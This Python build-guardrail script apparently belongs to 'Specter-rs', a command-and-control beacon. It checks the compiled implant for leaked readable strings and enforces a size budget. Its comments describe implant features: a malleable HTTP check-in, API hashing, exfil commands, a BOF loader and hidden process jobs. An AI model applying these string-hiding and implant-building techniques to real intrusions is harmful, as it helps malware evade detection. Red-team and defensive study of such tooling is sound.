#!/usr/bin/env python3
"""Specter-rs blob guardrails.

Enforces the invariants that keep the beacon true to the project's
philosophy (docs/ETUDE-DE-FAISABILITE.md, section 1):

1. No unintended text strings: the blob must contain no ASCII run of 12+
   printable bytes that is not accounted for. Intended config data
   (user agents, URIs, headers from the malleable profile) is declared by
   the build in a strings manifest (--manifest, produced by the build
   script). Everything else — leaked panic messages, paths, symbol
   names — fails the build. Without a manifest, any such run fails.
   Threshold rationale: executable code naturally produces printable byte
   runs (register push/pop sequences: "AWAVVWSH", deep prologues up to
   "AWAVAUATVWUSH", 13-14 bytes observed); real leaks (panic strings, build
   paths, identifiers) are prose-like and longer. The threshold sits at 18
   with margin over the deepest observed code run. Shorter runs are still
   reported for review, not fatal.
2. Size budget: the blob must stay under the budget (raise it
   deliberately, in its own commit, never as a side effect).

Run by `make check` and by CI on every push.
"""

import argparse
import json
import sys

# Runs of 18+ printable bytes are failures; 5..17 are review-only.
MIN_RUN = 5
FAIL_RUN = 18
PRINTABLE = range(0x20, 0x7F)
# Raised 8192 -> 12288 for the phase 3 HTTP transport (WinHTTP by hash,
# check-in cycle, malleable shaping): ~1.9 KiB of transport glue plus the
# listener-profile strings. Deliberate raise, its own commit.
# Raised 12288 -> 16384 for the iteration 8+9 growth: the restored (and
# functional) transaction chain after the -Oz dead-path fix (~1.8 KiB)
# plus the identity completion (internal IP, joined domain, elevation
# via iphlpapi/netapi32/advapi32).
# Raised 16384 -> 20480 for the operator command set: the file commands
# (pwd/cd/ls/cat at 15.4 KiB, mkdir/rm/cp/mv at 16.8 KiB) — process,
# shell, bof, tokens and forwarding come next.
# Raised 20480 -> 24576 for the transfer commands (download/upload/exfil:
# streaming download state, heap upload accumulation, chunk plumbing).
# Raised 24576 -> 32768 for the BOF loader (COFF parse, relocations, Beacon
# API shims, the pending output queue) and the debug channel: 29.6 KiB.
# Raised 32768 -> 40960 for the job infrastructure (ps run: pipe + hidden
# CreateProcessA + STARTUPINFOA layout, per-cycle stdout drain, jobs
# list/kill): 33.3 KiB. Deliberate raise, its own commit.
DEFAULT_MAX_SIZE = 40960


def find_strings(blob):
    """Return (offset, run) pairs for every printable run >= MIN_RUN."""
    found = []
    run_start = None
    for i, b in enumerate(blob):
        if b in PRINTABLE:
            if run_start is None:
                run_start = i
        else:
            if run_start is not None and i - run_start >= MIN_RUN:
                found.append((run_start, blob[run_start:i]))
            run_start = None
    if run_start is not None and len(blob) - run_start >= MIN_RUN:
        found.append((run_start, blob[run_start:]))
    return found


def allowed(s, manifest):
    """A blob string is allowed if it is part of a declared config string,
    or if it decomposes into declared strings glued by short printable
    segments (adjacent rdata constants concatenate in the single .text
    section: hosts+uris, name+": ", module-name literals)."""
    if any(s in entry for entry in manifest):
        return True
    return decomposes(s, manifest)


def decomposes(run, manifest):
    """Greedy longest-match: consume declared strings; the glue segments
    between them must stay under MIN_RUN (a real leak cannot hide in
    4 printable bytes)."""
    entries = sorted((e for e in manifest if e), key=len, reverse=True)
    pos = 0
    end = len(run)
    while pos < end:
        for entry in entries:
            if run.startswith(entry, pos):
                pos += len(entry)
                break
        else:
            nexts = [run.find(e, pos + 1) for e in entries]
            nexts = [i for i in nexts if i != -1]
            nxt = min(nexts) if nexts else end
            if nxt - pos >= MIN_RUN:
                return False
            pos = nxt
    return True


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("blob")
    ap.add_argument("--max-size", type=int, default=DEFAULT_MAX_SIZE)
    ap.add_argument(
        "--manifest",
        help="JSON array of strings the config intentionally embeds "
        "(build/config_strings.json, produced by the build script)",
    )
    args = ap.parse_args()
    blob = open(args.blob, "rb").read()

    manifest = []
    if args.manifest:
        try:
            manifest = json.load(open(args.manifest, encoding="utf-8"))
            if not isinstance(manifest, list):
                raise ValueError("not a list")
        except (OSError, ValueError) as e:
            print(f"[-] cannot read strings manifest {args.manifest}: {e}")
            sys.exit(1)

    ok = True

    strings = find_strings(blob)
    undeclared = [
        (off, s)
        for off, s in strings
        if len(s) >= FAIL_RUN and not allowed(s.decode("ascii", "replace"), manifest)
    ]
    review = [
        (off, s)
        for off, s in strings
        if len(s) < FAIL_RUN and not allowed(s.decode("ascii", "replace"), manifest)
    ]
    if undeclared:
        ok = False
        print(f"[-] {len(undeclared)} undeclared text string(s) in the blob:")
        for off, s in undeclared[:10]:
            print(f"    {off:#08x}: {s!r}")
        if manifest:
            print("    (config strings are declared via --manifest; anything else is a leak)")
    if review:
        print(f"[*] {len(review)} short printable run(s), review only (under {FAIL_RUN} bytes):")
        for off, s in review[:5]:
            print(f"    {off:#08x}: {s!r}")

    if len(blob) > args.max_size:
        ok = False
        print(f"[-] blob is {len(blob)} bytes, over the {args.max_size}-byte budget")
        print("    (raise the budget deliberately in its own commit if this growth is intended)")
    else:
        print(f"[*] size: {len(blob)}/{args.max_size} bytes")

    if ok:
        print("[+] blob guardrails: PASS")
    else:
        sys.exit(1)


if __name__ == "__main__":
    main()
